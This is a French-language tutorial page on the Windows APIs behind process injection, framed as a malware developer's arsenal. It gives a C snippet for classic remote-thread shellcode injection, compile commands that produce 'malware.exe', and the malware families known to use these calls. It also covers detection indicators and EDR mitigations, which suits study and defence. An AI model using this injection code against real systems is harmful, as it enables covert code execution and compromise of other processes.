# Windows APIs - Arsenal du Malware Developer

APIs Windows critiques pour manipulation de processus, mémoire et accès système. VirtualAlloc, OpenProcess, WriteProcessMemory, GetProcAddress sont les fondations de toute injection, exploitation et persistance sur Windows.

⚠️ AVERTISSEMENT STRICT : Techniques de malware development avancées. Usage éducatif uniquement. Tests sur VM isolées. Usage malveillant = PRISON.

```c
// Allouer mémoire RWX dans processus distant
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
LPVOID remote_mem = VirtualAllocEx(hProc, NULL, size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);

// Écrire shellcode
WriteProcessMemory(hProc, remote_mem, shellcode, size, NULL);

// Exécuter via thread
CreateRemoteThread(hProc, NULL, 0,
                  (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
```

## Compilation

**Windows (MinGW)** :
```bash
gcc example.c -o malware.exe -lpsapi -ladvapi32
```

**MSVC** :
```bash
cl example.c /Fe:malware.exe advapi32.lib psapi.lib
```

## Concepts clés

- **VirtualAlloc/VirtualAllocEx** : Allocation mémoire avec permissions RWX pour shellcode
- **VirtualProtect** : Modifier permissions mémoire (W^X bypass, hook installation)
- **OpenProcess** : Obtenir HANDLE vers processus pour manipulation distante
- **WriteProcessMemory/ReadProcessMemory** : Lire/écrire mémoire inter-processus
- **CreateToolhelp32Snapshot** : Énumérer processus/threads/modules (process discovery)
- **LoadLibrary/GetProcAddress** : Résolution dynamique d'APIs (éviter IAT)
- **PEB (Process Environment Block)** : Structure userland contenant infos processus

## Techniques utilisées par

- **Cobalt Strike** : VirtualAllocEx + WriteProcessMemory pour injection, GetProcAddress pour résolution
- **Metasploit** : CreateToolhelp32Snapshot pour process listing, OpenProcess pour migration
- **Emotet** : LoadLibrary pour charger modules, WriteProcessMemory pour injection inter-processus
- **TrickBot** : VirtualProtect pour unhooking, ReadProcessMemory pour memory scraping
- **Ransomware** : CreateToolhelp32Snapshot pour tuer AV/EDR, privilege escalation APIs

## Détection et Mitigation

**Indicateurs de détection** :
- OpenProcess avec PROCESS_ALL_ACCESS vers processus sensibles (lsass.exe, svchost.exe)
- VirtualAllocEx avec PAGE_EXECUTE_READWRITE (allocation RWX suspecte)
- WriteProcessMemory suivi de CreateRemoteThread (classic injection pattern)
- GetProcAddress pour APIs sensibles (VirtualProtect, LoadLibrary, etc.)

**Mitigations EDR** :
- Sysmon Event ID 10 (ProcessAccess) pour OpenProcess monitoring
- Kernel callbacks pour détecter allocations RWX
- IAT/EAT hooking pour intercepter VirtualAlloc, WriteProcessMemory
- Protected Process Light (PPL) pour protéger processus critiques
- Control Flow Guard (CFG) et Code Integrity Guard (CIG)
